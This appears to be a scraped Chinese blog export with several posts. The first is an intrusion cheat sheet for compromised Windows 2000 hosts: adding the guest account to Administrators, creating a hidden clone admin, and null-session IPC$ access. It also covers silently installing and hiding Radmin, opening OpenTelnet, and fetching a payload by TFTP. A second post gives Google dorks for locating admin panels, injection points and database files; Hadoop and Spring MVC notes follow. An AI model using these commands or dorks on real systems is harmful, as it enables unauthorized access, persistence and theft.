telnettelnet连接工具：OpenTelnet删除共享： net share e123=e:\\删除共享： net share c$ /del启用GUEST：net user guest /active:yes为GUEST设密码：net user guest 888888提升到管理员：net localgroup “Administrators” guest /add 超级用户隐藏器:c:\\door adminserver$:admin 克隆帐号：ca \\IP 你建立的帐号 密码 肉机默认帐号 密码ca \\127.0.0.1 adminserver$ admin adminserver admin 完全禁止系统模认工享[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\DelegateFolders{59031a47-3f72-44a7-89c5-5595fe6b30ee}] 3389替换服务———————–中修改[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\TermService]c:\\winnt\\system32\\copy termsrv.exe service.exec:\\winnt\\system32\\cd..c:\\winnt\\sc \\127.0.0.1 config Alerter binpath= c:\\winnt\\system32\\service.exe 端口转向：f:\\web\\ftp.exe “c:\\fpipe.exe -v -l 开放的端口 -r 要转向的端口 ip” 使用空口令连接:net use \\对方IP\\ipc$ “” /user:”administrator”(在上传文件的目录下)远程复制文件:c:\\radmin&gt;net use \\a-01\\ipc$ “12345” /user:administrator c:\\ramdin&gt;copy r_server.exe \\a-01\\admin$\\system32c:\\ramdin&gt;copy radmin.reg \\a-01\\admin$\\sytem32在对方CMD下：c:\\winnt\\system32>regedit /s radmin.regc:\\winnt\\system32>r_server.exe /install /silenecnet start r_server copy r_server.exe \\对方IP\\admin$\\system32c:\\opentelnet.exe \\IP ADMINISTRATOR “” 0 90 copy 文件名 \\IP\\admin$\\system32进入对方CMD:c:\\opentelnet.exe \\Ip administrator “” 0 90登陆CMD:c:\\telnet IP 90 安装RADMIN:c:\\winnt\\system32\\ r_server /install silencec:\\winnt\\system32\\ r-server导入注册表:c:\\winnt\\system32\\regedit.exe /s aaa.reg看端口:c:\\winnt\\system32\\ netstat -an改端口:c:\\winnt\\system32\\ r_server.exe /port:1024 /pass:1234 /save /silence起动服务:c:\\winnt\\system32\\net start r_server隐藏文件:c:\\winnt\\system32\\attrib.exe +h r_server.exe +h %systemroot$\\system32 看看共享开了没有,没有的话把共享开开 c:\\winnt\\system32&gt;net share清单是空的。 c:\\winnt\\system32&gt;net share ipc$命令成功完成。c:\\winnt\\system32&gt;net share admin$命令成功完成。 注册表运行命令regedit 查看端口：netstat-n SA传送文件TFTP先在本机开tftp服务 sqlexec tftp-i IP get windxp.exe c:\\windows\\system32\\com\\windxp.exe 2000命令集———————————win2000命令集accwiz.exe &gt; accessibility wizard for walking you through setting up your machine for your mobility needs. 辅助工具向导 acsetups.exe &gt; acs setup dcom server executable actmovie.exe &gt; direct show setup tool 直接显示安装工具 append.exe &gt; allows programs to open data in specified directories as if they were in the current directory. 允许程序打开制定目录中的数据 arp.exe &gt; network display and modify ip - hardware addresses 显示和更改计算机的ip与硬件物理地址的对应列表 at.exe &gt; at is a scheduling utility also included with unix 计划运行任务 atmadm.exe &gt; displays statistics for atm call manager. atm调用管理器统计 attrib.exe &gt; display and modify attributes for files and folders 显示和更改文件和文件夹属性 autochk.exe &gt; used to check and repair windows file systems 检测修复文件系统 autoconv.exe &gt; automates the file system conversion during reboots 在启动过程中自动转化系统 autofmt.exe &gt; automates the file format process during reboots 在启动过程中格式化进程 autolfn.exe &gt; used for formatting long file names 使用长文件名格式 bootok.exe &gt; boot acceptance application for registry bootvrfy.exe &gt; bootvrfy.exe, a program included in windows 2000 that notifies the system that startup was successful. bootvrfy.exe can be run on a local or remote computer. 通报启动成功cacls.exe &gt; displays or modifies access control lists (acls) of files. 显示和编辑acl calc.exe &gt; windows calculators 计算器 cdplayer.exe &gt; windows cd player cd播放器 change.exe &gt; change { user | port | logon } 与终端服务器相关的查询 charmap.exe &gt; character map 字符映射表 chglogon.exe &gt; same as using “change logon” 启动或停用会话记录 chgport.exe &gt; same as using “change port” 改变端口（终端服务） chgusr.exe &gt; same as using “change user” 改变用户（终端服务） chkdsk.exe &gt; check the hard disk for errors similar to scandisk 3 stages must specify a drive letter 磁盘检测程序 chkntfs.exe &gt; same as using chkdsk but for ntfs ntfs磁盘检测程序 cidaemon.exe &gt; component of ci filer service 组成ci文档服务 cipher.exe &gt; displays or alters the encryption of directories [files] on ntfs partitions. 在ntfs上显示或改变加密的文件或目录 cisvc.exe &gt; content index – it’s the content indexing service for i 索引内容 ckcnv.exe &gt; convertor 变换 cleanmgr.exe &gt; disk cleanup, popular with windows 98 磁盘清理 cliconfg.exe &gt; sql server client network utility sql客户网络工具 clipbrd.exe &gt; clipboard viewer for local will allow you to connect to other clipboards 剪贴簿查看器 clipsrv.exe &gt; start the clipboard server 运行clipboard服务 clspack.exe &gt; clspack used to create a file listing of system packages 建立系统文件列表清单 cluster.exe &gt; display a cluster in a domain 显示域的集群 cmd.exe &gt; famous command prompt 没什么好说的！ cmdl32.exe &gt; connection manager auto-download 自动下载连接管理 cmmgr32.exe &gt; connection manager 连接管理器 cmmon32.exe &gt; connection manager monitor 连接管理器监视 cmstp.exe &gt; connection manager profile manager 连接管理器配置文件安装程序 comclust.exe &gt; about cluster server 集群 comp.exe &gt; comclust add, remove, or join a cluster. 比较两个文件和文件集的内容＊ compact.exe &gt; displays or alters the compression of files on ntfs partitions. 显示或改变ntfs分区上文件的压缩状态 conime.exe &gt; console ime ime控制台 control.exe &gt; starts the control panel 控制面板 convert.exe &gt; convert file system to ntfs 转换文件系统到ntfs convlog.exe &gt; converts ms iis log files 转换iis日志文件格式到ncsa格式 cprofile.exe &gt; copy profiles 转换显示模式 c.exe &gt; ms windows s host version 5.1 较本宿主版本 csrss.exe &gt; client server runtime process 客户服务器runtime进程 csvde.exe &gt; comma separated variable import/export utility 日至格式转换程序 dbgtrace.exe &gt; 和terminal server相关 dcomcnfg.exe &gt; display the current dcom configuration. dcom配置属性 dcphelp.exe &gt; ? dcpromo.exe &gt; promote a domain controller to adsi ad安装向导 ddeshare.exe &gt; display dde shares on local or remote computer dde共享 ddmprxy.exe &gt; debug.exe &gt; runs debug, a program testing and editing tool. 就是debug啦！ dfrgfat.exe &gt; defrag fat file system fat分区磁盘碎片整理程序 dfrgntfs.exe &gt; defrag ntfs file system ntfs分区磁盘碎片整理程序 dfscmd.exe &gt; configures a dfs tree 配置一个dfs树 dfsinit.exe &gt; distributed file system initialization 分布式文件系统初始化 dfssvc.exe &gt; distributed file system server 分布式文件系统服务器 diantz.exe &gt; ms cabinet maker 制作cab文件 diskperf.exe &gt; starts physical disk performance counters 磁盘性能计数器 dllhost.exe &gt; dllhost is used on all versions of windows 2000. dllhost is the hedost process for all com+ applications. 所有com+应用软件的主进程 dllhst3g.exe &gt; dmadmin.exe &gt; disk manager service 磁盘管理服务 dmremote.exe &gt; part of disk management 磁盘管理服务的一部分 dns.exe &gt; dns applications dns doskey.exe &gt; recalls windows command lines and creates macros 命令行创建宏 dosx.exe &gt; dos extender dos扩展 dplaysvr.exe &gt; direct play helper 直接运行帮助 drwatson.exe &gt; dr watson for 2000 fault detector 华生医生错误检测 drwtsn32.exe &gt; dr watson for 2000 viewer and configuration manager 华生医生显示和配置管理 dtcsetup.exe &gt; installs mdtc dvdplay.exe &gt; windows 2000 dvd player dvd播放 dxdiag.exe &gt; direct-x diagnostics direct-x诊断工具 edlin.exe &gt; line-oriented text editor. 命令行的文本编辑器（历史悠久啊！）edlin.exe &gt; line-oriented text editor. 命令行的文本编辑器（历史悠久啊！） esentutl.exe &gt; ms database utility ms数据库工具 eudcedit.exe &gt; private character editor ture type造字程序 eventvwr.exe &gt; windows 2000 event viewer 事件查看器 evntcmd.exe &gt; event to trap translator; configuration tool evntwin.exe &gt; event to trap translator setup exe2bin.exe &gt; converts exe to binary format 转换exe文件到二进制 expand.exe &gt; expand files that have been compressed 解压缩 extrac32.exe &gt; cab file extraction utility 解cab工具 fastopen.exe &gt; fastopen tracks the of files on a hard disk and stores the information in memory for fast access. 快速访问在内存中的硬盘文件 faxcover.exe &gt; fax cover page editor 传真封面编辑 faxqueue.exe &gt; display fax queue 显示传真队列 faxsend.exe &gt; fax wizard for sending faxes 发送传真向导 faxsvc.exe &gt; starts fax server 启动传真服务 fc.exe &gt; compares two files or sets of files and their differences 比较两个文件的不同 find.exe &gt; searches for a text string in file or files 查找文件中的文本行 findstr.exe &gt; searches for strings in files 查找文件中的行 finger.exe &gt; fingers a user and displays statistics on that user finger一个用户并显示出统计结果 fixmapi.exe &gt; fix mapi files 修复mapi文件 flattemp.exe &gt; enable or disable temporally directories 允许或者禁用临时文件目录 fontview.exe &gt; display fonts in a font file 显示字体文件中的字体 forcedos.exe &gt; forces a file to start in dos mode. 强制文件在dos模式下运行 freecell.exe &gt; popular windows game 空当接龙 ftp.exe &gt; file transfer protocol used to transfer files over a network connection 就是ftp了 gdi.exe &gt; graphic device interface 图形界面驱动 grovel.exe &gt; grpconv.exe &gt; program manager group convertor 转换程序管理员组 help.exe &gt; displays help for windows 2000 commands 显示帮助 hostname.exe &gt; display hostname for machine. 显示机器的hostname ie4uinit.exe &gt; ie5 user install tool ie5用户安装工具 ieshwiz.exe &gt; customize folder wizard 自定义文件夹向导 iexpress.exe &gt; create and setup packages for install 穿件安装包 iisreset.exe &gt; restart iis admin service 重启iis服务 internat.exe &gt; keyboard language indicator applet 键盘语言指示器 ipconfig.exe &gt; windows 2000 ip configuration. 察看ip配置 ipsecmon.exe &gt; ip security monitor ip安全监视器 ipxroute.exe &gt; ipx routing and source routing control program ipx路由和源路由控制程序 irftp.exe &gt; setup ftp for wireless communication 无线连接 ismserv.exe &gt; intersite messaging service 安装或者删除service control manager中的服务 jdbgmgr.exe &gt; microsoft debugger for 4的调试器 jetconv.exe &gt; convert a jet engine database 转换jet engine数据库 jetpack.exe &gt; compact jet database. 压缩jet数据库 jview.exe &gt; command-line loader for 的命令行装载者 krnl386.exe &gt; core component for windows 2000 2000的核心组件 label.exe &gt; change label for drives 改变驱动器的卷标 lcwiz.exe &gt; license compliance wizard for local or remote systems. 许可证符合向导 ldifde.exe &gt; ldif cmd line manager ldif目录交换命令行管理 licmgr.exe &gt; terminal server license manager 终端服务许可协议管理 lights.exe &gt; display connection status lights 显示连接状况 llsmgr.exe &gt; windows 2000 license manager 2000许可协议管理 llssrv.exe &gt; start the license server 启动许可协议服务器 lnkstub.exe &gt; locator.exe &gt; rpc locator 远程定位 lodctr.exe &gt; load perfmon counters 调用性能计数 logoff.exe &gt; log current user off. 注销用户 lpq.exe &gt; displays status of a remote lpd queue 显示远端的lpd打印队列的状态，显示被送到基于unix的服务器的打印任务 lpr.exe &gt; send a print job to a network printer. 重定向打印任务到网络中的打印机。通常用于unix客户打印机将打印任务发送给连接了打印设备的nt的打印机服务器。 lsass.exe &gt; lsa executable and server dll 运行lsa和server的dll lserver.exe &gt; specifies the new dns domain for the default server 指定默认server新的dns域 macfile.exe &gt; used for managing macfiles 管理macfiles magnify.exe &gt; used to magnify the current screen 放大镜 makecab.exe &gt; ms cabinet maker 制作cab文件 mdm.exe &gt; machine debug manager 机器调试管理 mem.exe &gt; display current memory stats 显示内存状态 migpwd.exe &gt; migrate passwords. 迁移密码 mmc.exe &gt; microsoft management console 控制台 mnmsrvc.exe &gt; netmeeting remote desktop sharing netmeeting远程桌面共享 mobsync.exe &gt; manage synchronization. 同步目录管理器 mountvol.exe &gt; creates, s, or lists a volume mount point. 创建、删除或列出卷的装入点。 mplay32.exe &gt; ms media player 媒体播放器mpnotify.exe &gt; multiple provider notification application 多提供者通知应用程序 mq1sync.exe &gt; mqbkup.exe &gt; ms message queue backup and restore utility 信息队列备份和恢复工具 mqexchng.exe &gt; msmq exchange connector setup 信息队列交换连接设置 mqmig.exe &gt; msmq migration utility 信息队列迁移工具 mqsvc.exe &gt; ? mrinfo.exe &gt; multicast routing using snmp 使用snmp多点传送路由 mscdexnt.exe &gt; installs mscd (ms cd extensions) 安装mscd msdtc.exe &gt; dynamic transaction controller console 动态事务处理控制台 msg.exe &gt; send a message to a user local or remote. 发送消息到本地或远程客户 mshta.exe &gt; html application host html应用程序主机 msiexec.exe &gt; starts windows installer program 开始windows安装程序 mspaint.exe &gt; microsoft paint 画板 msswchx.exe &gt; mstask.exe &gt; task schedule program 任务计划表程序 mstinit.exe &gt; task scheduler setup 任务计划表安装 narrator.exe &gt; program will allow you to have a narrator for reading. microsoft讲述人 nbtstat.exe &gt; displays protocol stats and current tcp/ip connections using nbt 使用 nbt（tcp/ip 上的 netbios）显示协议统计和当前 tcp/ip 连接。 nddeapir.exe &gt; ndde api server side ndde api服务器端 net.exe &gt; net utility 详细用法看/？ net1.exe &gt; net utility d version from ms net的升级版 netdde.exe &gt; network dde will install itself into the background 安装自己到后台 netsh.exe &gt; creates a shell for network information 用于配置和监控 windows 2000 命令行脚本接口。 netstat.exe &gt; displays current connections. 显示协议统计和当前的 tcp/ip 网络连接。 nlsfunc.exe &gt; loads country-specific information 加载特定国家（地区）的信息。windows 2000 和 ms-dos 子系统不使用该命令。接受该命令只是为了与 ms-dos 文件兼容。 notepad.exe &gt; opens windows 2000 notepad 记事本 nslookup.exe &gt; displays information for dns 该诊断工具显示来自域名系统 (dns) 名称服务器的信息。 ntbackup.exe &gt; opens the nt backup utility 备份和故障修复工具 ntbooks.exe &gt; starts windows help utility 帮助 ntdsutil.exe &gt; performs db maintenance of the adsi 完成adsi的db的维护 ntfrs.exe &gt; nt file replication service nt文件复制服务 ntfrsupg.exe &gt; ntkrnlpa.exe &gt; kernel patch 核心补丁 ntoskrnl.exe &gt; core nt kernel kt的核心 ntsd.exe &gt; ntvdm.exe &gt; simulates a 16-bit windows environment 模拟16位windows环境 nw16.exe &gt; netware redirector netware转向器 nw.exe &gt; runs netware s 运行netware脚本 odbcad32.exe &gt; odbc 32-bit administrator 32位odbc管理 odbcconf.exe &gt; configure odbc driver’s and data source’s from command line 命令行配置odbc驱动和数据源 os2.exe &gt; an os/2 warp server (os2 /o) os/2 os2srv.exe &gt; an os/2 warp server os/2 os2ss.exe &gt; an os/2 warp server os/2 osk.exe &gt; on screen keyboard 屏幕键盘 packager.exe &gt; windows 2000 packager manager 对象包装程序 pathping.exe &gt; combination of ping and tracert 包含ping和tracert的程序 pax.exe &gt; is a posix program and path names used as arguments must be specified in posix format. use “//c/users/default” instead of “c:usersdefault.” 启动便携式存档互换 (pax) 实用程序 pentnt.exe &gt; used to check the pentium for the floating point division error. 检查pentium的浮点错误 perfmon.exe &gt; starts windows performance monitor 性能监视器 ping.exe &gt; packet internet groper 验证与远程计算机的连接 posix.exe &gt; used for backward compatibility with unix 用于兼容unix print.exe &gt; cmd line used to print files 打印文本文件或显示打印队列的内容。 progman.exe &gt; program manager 程序管理器 proquota.exe &gt; profile quota program psxss.exe &gt; posix subsystem application posix子系统应用程序 qappsrv.exe &gt; displays the available application terminal servers on the network在网络上显示终端服务器可用的程序 qprocess.exe &gt; display information about processes local or remote 在本地或远程显示进程的信息（需终端服务） query.exe &gt; query termserver user process and sessions 查询进程和对话 quser.exe &gt; display information about a user logged on 显示用户登陆的信息（需终端服务） qwinsta.exe &gt; display information about terminal sessions. 显示终端服务的信息 rasadmin.exe &gt; start the remote access admin service 启动远程访问服务 rasautou.exe &gt; creates a ras connection 建立一个ras连接 rasdial.exe &gt; dial a connection 拨号连接 rasphone.exe &gt; starts a ras connection 运行ras连接 rcp.exe &gt; copies a file from and to a rcp service. 在 windows 2000 计算机和运行远程外壳端口监控程序 rshd 的系统之间复制文件 rdpclip.exe &gt; rdpclip allows you to copy and paste files between a terminal session and client console session. 再终端和本地复制和粘贴文件 recover.exe &gt; recovers readable information from a bad or defective disk 从坏的或有缺陷的磁盘中恢复可读取的信息。 redir.exe &gt; starts the redirector service 运行重定向服务 regedt32.exe &gt; 32-bit register service 32位注册服务 regini.exe &gt; modify registry permissions from within a 用脚本修改注册许可 register.exe &gt; register a program so it can have special execution characteristics. 注册包含特殊运行字符的程序 regsvc.exe &gt; regsvr32.exe &gt; registers and unregister’s dll’s. as to how and where it register’s them i dont know. 注册和反注册dll regtrace.exe &gt; options to tune debug options for applications failing to dump trace statementstrace 设置regwiz.exe &gt; registration wizard 注册向导 remrras.exe &gt; replace.exe &gt; replace files 用源目录中的同名文件替换目标目录中的文件。 reset.exe &gt; reset an active section 重置活动部分 rexec.exe &gt; runs commands on remote hosts running the rexec service. 在运行 rexec 服务的远程计算机上运行命令。rexec 命令在执行指定命令前，验证远程计算机上的用户名，只有安装了 tcp/ip 协议后才可以使用该命令。 risetup.exe &gt; starts the remote installation service wizard. 运行远程安装向导服务 route.exe &gt; display or edit the current routing tables. 控制网络路由表 routemon.exe &gt; no longer supported 不再支持了！ router.exe &gt; router software that runs either on a dedicated dos or on an os/2 system. route软件在 dos或者是os/2系统 rsh.exe &gt; runs commands on remote hosts running the rsh service 在运行 rsh 服务的远程计算机上运行命令 rsm.exe &gt; mounts and configures remote system media 配置远程系统媒体 rsnotify.exe &gt; remote storage notification recall 远程存储通知回显 rsvp.exe &gt; resource reservation protocol 源预约协议 runas.exe &gt; run a program as another user 允许用户用其他权限运行指定的工具和程序 rundll32.exe &gt; launches a 32-bit dll program 启动32位dll程序 runonce.exe &gt; causes a program to run during startup 运行程序再开始菜单中 rwinsta.exe &gt; reset the session subsystem hardware and software to known initial values 重置会话子系统硬件和软件到最初的值 savedump.exe &gt; does not write to e:winntuser.dmp 不写入user.dmp中 scardsvr.exe &gt; smart card resource management server 子能卡资源管理服务器 schupgr.exe &gt; it will read the schema files (.ldf files) and upgrade the schema. (part of adsi) 读取计划更新文件和更新计划 secedit.exe &gt; starts security editor help 自动安全性配置管理 services.exe &gt; controls all the services 控制所有服务 sethc.exe &gt; set high contrast - changes colours and display mode logoff to set it back to normal 设置高对比 setreg.exe &gt; shows the software publishing state key values 显示软件发布的国家语言 setup.exe &gt; gui box prompts you to goto control panel to configure system components 安装程序（转到控制面板） setver.exe &gt; set version for files 设置 ms-dos 子系统向程序报告的 ms-dos 版本号 sfc.exe &gt; system file checker test and check system files for integrity 系统文件检查 sfmprint.exe &gt; print services for macintosh 打印macintosh服务 sfmpsexe.exe &gt; sfmsvc.exe &gt; shadow.exe &gt; monitor another terminal services session. 监控另外一台中端服务器会话 share.exe &gt; windows 2000 和 ms-dos 子系统不使用该命令。接受该命令只是为了与 ms-dos 文件兼容 shmgrate.exe &gt; shrpubw.exe &gt; create and share folders 建立和共享文件夹 sigverif.exe &gt; file signature verification 文件签名验证 skeys.exe &gt; serial keys utility 序列号制作工具 smlogsvc.exe &gt; performance logs and alerts 性能日志和警报 smss.exe &gt; sndrec32.exe &gt; starts the windows sound recorder 录音机 sndvol32.exe &gt; display the current volume information 显示声音控制信息 snmp.exe &gt; simple network management protocol used for network mangement 简单网络管理协议 snmptrap.exe &gt; utility used with snmp snmp工具 sol.exe &gt; windows solitaire game 纸牌 sort.exe &gt; compares files and folders 读取输入、排序数据并将结果写到屏幕、文件和其他设备上 spoolsv.exe &gt; part of the spooler service for printing 打印池服务的一部分 sprestrt.exe &gt; srvmgr.exe &gt; starts the windows server manager 服务器管理器 stimon.exe &gt; wdm stillimage- &gt; monitor stisvc.exe &gt; wdm stillimage- &gt; service subst.exe &gt; associates a path with a drive letter 将路径与驱动器盘符关联 svchost.exe &gt; svchost.exe is a generic host process name for services that are run from dynamic-link libraries (dlls). dll得主进程 syncapp.exe &gt; creates windows briefcase. 创建windows文件包 sysedit.exe &gt; opens editor for 4 system files 系统配置编辑器 syskey.exe &gt; encrypt and secure system database nt账号数据库按群工具 sysocmgr.exe &gt; windows 2000 setup 2000安装程序 systray.exe &gt; starts the systray in the lower right corner. 在低权限运行systray taskman.exe &gt; task manager 任务管理器 taskmgr.exe &gt; starts the windows 2000 task manager 任务管理器 tcmsetup.exe &gt; telephony client wizard 电话服务客户安装 tcpsvcs.exe &gt; tcp services tcp服务 .exe &gt; telnet utility used to connect to telnet server termsrv.exe &gt; terminal server 终端服务 tftp.exe &gt; trivial ftp 将文件传输到正在运行 tftp 服务的远程计算机或从正在运行 tftp 服务的远程计算机传输文件 tftpd.exe &gt; trivial ftp daemon themes.exe &gt; change windows themes 桌面主题 tlntadmn.exe &gt; telnet server administrator telnet服务管理 tlntsess.exe &gt; display the current telnet sessions 显示目前的telnet会话 tlntsvr.exe &gt; start the telnet server 开始telnet服务 tracert.exe &gt; trace a route to display paths 该诊断实用程序将包含不同生存时间 (ttl) 值的 internet 控制消息协议 (icmp) 回显数据包发送到目标，以决定到达目标采用的路由 tsadmin.exe &gt; terminal server administrator 终端服务管理器 tscon.exe &gt; attaches a user session to a terminal session. 粘贴用户会话到终端对话 tsdiscon.exe &gt; disconnect a user from a terminal session 断开终端服务的用户 tskill.exe &gt; kill a terminal server process 杀掉终端服务 tsprof.exe &gt; used with terminal server to query results. 用终端服务得出查询结果 tsshutdn.exe &gt; shutdown the system 关闭系统 unlodctr.exe &gt; part of performance monitoring 性能监视器的一部分 upg351db.exe &gt; upgrade a jet database 升级jet数据库 ups.exe &gt; ups service ups服务 user.exe &gt; core windows service windows核心服务 userinit.exe &gt; part of the winlogon process winlogon进程的一部分 usrmgr.exe &gt; start the windows user manager for domains 域用户管理器 utilman.exe &gt; this tool enables an administrator to designate which computers automatically open accessibility tools when windows 2000 starts. 指定2000启动时自动打开那台机器 verifier.exe &gt; driver verifier manager driver verifier manager vwipxspx.exe &gt; loads ipx/spx vdm 调用ipx/spx vdm w32tm.exe &gt; windows time server 时间服务器 wextract.exe &gt; used to extract windows files 解压缩windows文件 winchat.exe &gt; opens windows chat 打开windows聊天","tags":[{"name":"cmd命令","slug":"cmd命令","permalink":"http://yoursite.com/tags/cmd命令/"},{"name":"黑客工具","slug":"黑客工具","permalink":"http://yoursite.com/tags/黑客工具/"}]},{"title":"正确使用谷歌","date":"2017-05-20T16:27:17.000Z","path":"2017/05/21/正确使用谷歌/","text":"搜索中的hack我们平时使用搜索引擎，最简单直接的就是输入想要查找的内容，然后点击搜索。但是这种搜索效率不高！不能准确定位要查找的内容。下面将介绍搜索中的hack方法。intext:这个就是把网页中的正文内容中的某个字符做为搜索条件.例如在google里输入:intext:动网.将返回所有在网页正文部分包含”动网”的网页. allintext:使用方法和intext类似. intitle:和上面那个intext差不多,搜索网页标题中是否有我们所要找的字符.例如搜索:intitle:安全天使.将返回所有网页标题中包含”安全天使”的网页.同理 allintitle:也同intitle类似. cache:搜索google里关于某些内容的缓存,有时候也许能找到一些好东西哦. define:搜索某个词语的定义,搜索:define:hacker,将返回关于hacker的定义. filetype:这个我要重点推荐一下,无论是撒网式攻击还是我们后面要说的对特定目标进行信息收集都需要用到这个.搜索指定类型的文件.例如输入:filetype:doc.将返回所有以doc结尾的文件URL.当然如果你找.bak、.mdb或.inc也是可以的,获得的信息也许会更丰富inf查找指定站点的一些基本信息. inurl:搜索我们指定的字符是否存在于URL中.例如输入:inurl:admin,将返回N个类似于这样的连接http://www.claepo.com/xxx/admin,用来找管理员登陆的URL不错. allinurl也同inurl类似,可指定多个字符. link:例如搜索:inurl:www.4ngel.net可以返回所有和www.claepo.com做了链接的URL. site:这个也很有用,例如:site:claepo.com 将返回所有和claepo.com这个站有关的URL. 下面是附加 找管理后台地址：site:xxx.com intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号site:xxx.com inurl:login/admin/manage/manager/admin_login/login_admin/system/boss/mastersite:xxx.com intitle:管理|后台|登陆| 找上传一类的漏洞：site:xxx.com inurl:filesite:xxx.com inurl:load 找注入点页面：site:xxx.com inurl:php?id= 找编辑器页面：site:xxxx.com inurl:fcksite:xxx.com inurl:ewebeditor 找重要文件：site:xxx.com inurl:robots.txtsite:xxx.com filetype:mdbsite:xxx.com filetype:inisite:xxx.com inurl:txt site:xxx.com filetype:phpsite:xxx.com filetype:asp 注意：不要带上www，因为这样可以搜索到二级域名哦！搜索的文件名只是抛砖引玉，想出更多的文件名来发挥到极致！ 最后PS可以在搜索引擎的搜索栏中右击修改搜索引擎。","tags":[{"name":"搜索","slug":"搜索","permalink":"http://yoursite.com/tags/搜索/"},{"name":"技巧","slug":"技巧","permalink":"http://yoursite.com/tags/技巧/"}]},{"title":"hadoop入门","date":"2017-05-13T10:16:16.000Z","path":"2017/05/13/hadoop入门/","text":"准备工作 linux环境 安装并配置好jdk(java) 安装并配置好hadoop linux环境可以使用虚拟机，也可以租用云主机 安装jdk 先javac会提示没有安装，同时还会提示怎么安装 按照提示安装open jdk …apt-get install ... 根据安装提示，找到安装路径，配置java环境变量 /usr/lib/jvm/java-7-openjdk-amd64/...复制备用vi /etc/profile添加配置信息 1234export JAVA_HOME=/usr/lib/jvm/java-7-openjdk-amd64export JRE_HOME=$JAVAHOME/jreexport CLASSPATH=$JAVA_HOME/lib:$JRE_HOME/lib:$CLASSPATHexport PATH=$JAVA_HOME/bin:$JRE_HOME/bin:$HADOOP_HOME/bin:$PATH source /etc/profile使配置的环境变量生效 输入javac测试是否生效warn：如果是桌面版Ubuntu 16.04 LTS的话，不能按照上述方法。配置java环境变量的文件在~/.bashrc文件下，如果更改/etc/profile文件，将会覆盖掉很大一部分linux命令，sudo都不能用，生效配置用source 安装并配置好hadoop 下载hadoop http://www.apache.org/dyn/closer.cgi/hadoop/common/ 选好镜像版本复制下载链接，在terminal中用wget http://...（下载地址） （可选）移动hadoop到/opt目录下，并解压tar -xzvf ... 三种运行方式1.单机模式默认情况下，Hadoop 被配置成以非分布式模式运行的一个独立 Java 进程。这对调试非常有帮助。 下面的实例将已解压的 conf 目录拷贝作为输入，查找并显示匹配给定正则表达式的条目。输出写入到指定的 output 目录。 cp LICENSE.txt input #把license.txt复制到input文件夹&gt;当中cd .. ＃回到上一级目录hadoop jar hadoop-examples-1.2.1.jar wordcount input &gt;output #运行wordcount例子，结果放到output文件夹当中cat output/* #结果呈现 2.伪分布式Hadoop安装 vi hadoop-env.sh配置JAVA_HOME(echo $JAVA_HOME) 到conf目录下vi core-site.xml添加下面配置信息 12345678910111213141516&lt;configuration&gt;&lt;property&gt; &lt;name&gt;fs.default.name&lt;/name&gt; &lt;value&gt;hdfs://localhost:9000&lt;/value&gt;&lt;/property&gt;&lt;property&gt; &lt;name&gt;hadoop.tmp.dir&lt;/name&gt; &lt;value&gt;/hadoop&lt;/value&gt;&lt;/property&gt;&lt;property&gt; &lt;name&gt;dfs.name.dir&lt;/name&gt; &lt;value&gt;/hadoop/name&lt;/value&gt;&lt;/property&gt;&lt;/configuration&gt; 配置vi hdfs-site.xml 12345&lt;configuration&gt;&lt;property&gt; &lt;name&gt;dfs.data.dir&lt;/name&gt; &lt;value&gt;/hadoop/data&lt;/value&gt;&lt;/property&gt; 配置vi fair-scheduler.xml 123456&lt;allocations&gt;&lt;property&gt; &lt;name&gt;mapred.job.tracker&lt;/name&gt; &lt;value&gt;localhost:9001&lt;/value&gt;&lt;/property&gt;&lt;/allocations&gt; 配置hadoop环境变量，类似java环境变量的配置vi /etc/profile添加export HADOOP_HOME=/opt/hadoop-1.2.1 生效配置source /etc/profile 测试hadoop是否配置成功，直接输入hadoop，会出现使用脚本信息 最后格式化。。。hadoop namenode -format 准备工作完结,以后再添加说明cd到bin目录，启动start-all.sh用jps查看hadoop是否正常运行hadoop fs -ls /查看hadoop下有哪些文件 未完。。。。 （补充：1. 打开ssh服务，/etc/init.d/ssh start开启ssh-server2.这边不错）","tags":[{"name":"hadoop","slug":"hadoop","permalink":"http://yoursite.com/tags/hadoop/"}]},{"title":"spring MVC两个应用上下文的故事","date":"2017-04-30T05:12:06.000Z","path":"2017/04/30/spring-MVC两个应用上下文的故事/","text":"最靓仔学习spring mvc时，对web.xml文件中配置的应用上下文感到困惑。于是上网找了资料。 《spring Action》书中说到： 当DispatcherServlet启动时，会创建Spring应用上下文，并加载配置文件或配置类中所声明的bean。但是在Spring Web应用中还有另外一个应用上下文，由ContextLoaderListener创建的。 我们希望DispatcherServlet加载包含web组件的bean，如控制器，视图解析器以及处理器映射，而ContextLoaderListener要加载应用中的其他bean，通常是应用后端的中间件和数据层组件。 当web容器tomcat启动时，会作如下事情： 启动一个WEB项目的时候,容器(如:Tomcat)会去读它的配置文件web.xml.读两个节点: &lt;listener&gt;&lt;/listener&gt; 和 &lt;context-param&gt;&lt;/context-param&gt; 紧接着,容器创建一个ServletContext(上下文)。在该应用内全局共享。 容器将&lt;context-param&gt;&lt;/context-param&gt;转化为键值对,并交给ServletContext. 容器创建&lt;listener&gt;&lt;/listener&gt;中的类实例,即创建监听.该监听器必须实现自ServletContextListener接口 在监听中会有contextInitialized(ServletContextEvent event)初始化方法，在这个方法中获得ServletContext = ServletContextEvent.getServletContext();“context-param的值” = ServletContext.getInitParameter(‘context-param的键’); 得到这个context-param的值之后,你就可以做一些操作了.注意,这个时候你的WEB项目还没有完全启动完成.这个动作会比所有的Servlet都要早.换句话说,这个时候,你对中的键值做的操作,将在你的WEB项目完全启动之前被执行. web.xml中可以定义两种参数：一个是全局参数(ServletContext)，通过 &lt;context-param&gt;&lt;/context-param&gt; 另一个是servlet参数，通过在servlet中声明 &lt;init-param&gt; &lt;param-name&gt;param1&lt;/param-name&gt; &lt;param-value&gt;avalible in servlet init()&lt;/param- value&gt; &lt;/init-param&gt; note：第一种参数在servlet里面可以通过getServletContext().getInitParameter(‘context/param’)得到；第二种参数只能在servlet的init()方法中通过this.getInitParameter(‘param1’)取得。 spring上下文的初始化 servlet容器启动，为应用创建一个“全局上下文环境”：ServletContext 容器调用web.xml中配置的contextLoaderListener，初始化WebApplicationContext上下文环境（即IOC容器），加载context-param指定的配置文件信息到IOC容器中。WebApplicationContext在ServletContext中以键值对的形式保存 容器初始化web.xml中配置的servlet，为其初始化自己的上下文信息servletContext，并加载其设置的配置信息到该上下文中。将WebApplicationContext设置为它的父容器。 